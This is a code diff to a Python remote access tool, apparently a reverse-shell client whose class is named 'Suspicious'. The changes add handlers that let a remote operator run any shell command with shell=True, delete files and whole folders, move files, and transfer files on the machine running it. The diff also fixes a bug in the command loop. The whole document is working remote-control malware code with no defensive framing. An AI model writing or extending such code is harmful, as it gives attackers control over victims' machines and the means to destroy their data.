@@ -8,6 +8,7 @@ import sys
 import json
 import socket
 import base64
+import shutil
 import subprocess
 
 class Suspicious:
@@ -18,12 +19,17 @@ class Suspicious:
         # platform = {'aix': "AIX", 'linux': "Linux", 'win32':'Windows', 'cygwin': "Windows.Cygwin", 'darwin': "MacOS"}
         # self.connetion.send(f"[+] Connected to {platform[sys.platform]} operating system")
 
+    def handleErrorDataSendType(self, error):
+        return str(error)
+
     def execute_system_commands(self, command):
         # the output data type of the check_output method is byte
         try:
+            command = " ".join(command)
             return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')
-        except:
-            return "------- [=] Error while executing the command [=] ------"
+        except Exception as error:
+            return self.handleErrorDataSendType(error)
+            # return "------- [=] Error while executing the command [=] ------"
 
     def changeWorkingDirectory(self, path):
         os.chdir(path)
@@ -54,18 +60,34 @@ class Suspicious:
     def getSystemInfo(self):
         platform = {'aix': 'AIX', 'linux':"Linux", 'win32': 'Windows', 'cygwin': 'Windows/Cygwin', 'darwin': 'macOs'}
         return f"[+] Connected to \"{platform[sys.platform]}\" operating system"
-
-    def delete_items(self, path):
+    
+    def delete_from_system(self, path):
         try:
-            import shutil
-            if os.path.isfile(path):
-                os.remove(path)
-                return "[=] File delete successful"
-            elif os.path.isdir(path):
+            if os.path.isdir(path):
                 shutil.rmtree(path)
-                return "[=] Folder delete successful"
+                return "[==] Folder delete successful"
+            elif os.path.isfile(path):
+                os.remove(path)
+                return "[==] file delete successfull"
         except Exception as error:
-            return str(error)
+            return self.handleErrorDataSendType(error)
+    
+    def move_files_within(self, src, dst):
+        try:
+            if os.path.isdir(dst):
+                shutil.move(src, dst)
+                return f"[==] folder moved to \"{dst}\" location"
+            else:
+                num = 0
+                while True:
+                    if not os.path.exists(dst):
+                        shutil.move(src, dst)
+                        break
+                    dst = dst + "-" + str(num)
+                    num+=1
+                return f"[==] folder moved to \"{dst}\" location"
+        except Exception as error:
+            return self.handleErrorDataSendType(error)
 
     def start(self):
         while True:
@@ -83,7 +105,9 @@ class Suspicious:
                 elif data_received[0].lower() == 'upload':
                     command_result = self.download_file(data_received[-2], data_received[-1])
                 elif data_received[0] == 'delete':
-                    command_result == self.delete_items(data_received[1])
+                    command_result = self.delete_from_system(data_received[1])
+                elif data_received[0] == 'move-within':
+                    command_result = self.move_files_within(data_received[1], data_received[2])
                 else:
                     command_result = self.execute_system_commands(data_received)
                 self.send_data(command_result)
